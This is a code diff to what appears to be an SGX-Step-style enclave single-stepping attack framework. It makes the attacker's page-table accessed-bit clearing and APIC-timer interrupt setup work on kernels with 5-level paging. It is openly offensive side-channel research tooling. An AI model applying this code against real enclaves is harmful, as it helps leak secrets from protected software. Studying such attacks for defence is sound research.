@@ -103,12 +103,9 @@ void aep_cb_func(void) {
      * narrow on low-frequency CPUs (e.g. Goldmont).
      */
     if (do_irq) {
-        *pgd_encl = MARK_NOT_ACCESSED(*pgd_encl);
-        *pud_encl = MARK_NOT_ACCESSED(*pud_encl);
-        *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
-        flush(pgd_encl);
-        flush(pud_encl);
-        flush(pmd_encl);
+        if (pgd_encl) { *pgd_encl = MARK_NOT_ACCESSED(*pgd_encl); flush(pgd_encl); }
+        if (pud_encl) { *pud_encl = MARK_NOT_ACCESSED(*pud_encl); flush(pud_encl); }
+        if (pmd_encl) { *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl); flush(pmd_encl); }
         apic_timer_irq(timer_interval);
     }
 }
@@ -173,12 +170,15 @@ void attacker_config_page_table(void) {
     mark_enclave_exec_not_accessed();
 
     // print_page_table( get_enclave_base() );
-    ASSERT(pmd_encl = remap_page_table_level(get_enclave_base(), PMD));
-    ASSERT(PRESENT(*pmd_encl));
-    ASSERT(pud_encl = remap_page_table_level(get_enclave_base(), PUD));
-    ASSERT(PRESENT(*pud_encl));
-    ASSERT(pgd_encl = remap_page_table_level(get_enclave_base(), PGD));
-    ASSERT(PRESENT(*pgd_encl));
+    /* The driver only walks 4 levels, so on a 5-level-paging kernel the upper
+     * lookups miss; keep the levels that resolve and clear only those. */
+    pmd_encl = remap_page_table_level(get_enclave_base(), PMD);
+    if (pmd_encl && !PRESENT(*pmd_encl)) pmd_encl = NULL;
+    pud_encl = remap_page_table_level(get_enclave_base(), PUD);
+    if (pud_encl && !PRESENT(*pud_encl)) pud_encl = NULL;
+    pgd_encl = remap_page_table_level(get_enclave_base(), PGD);
+    if (pgd_encl && !PRESENT(*pgd_encl)) pgd_encl = NULL;
+    ASSERT(pmd_encl || pud_encl || pgd_encl);
 }
 
 /* ================== ATTACKER MAIN ================= */
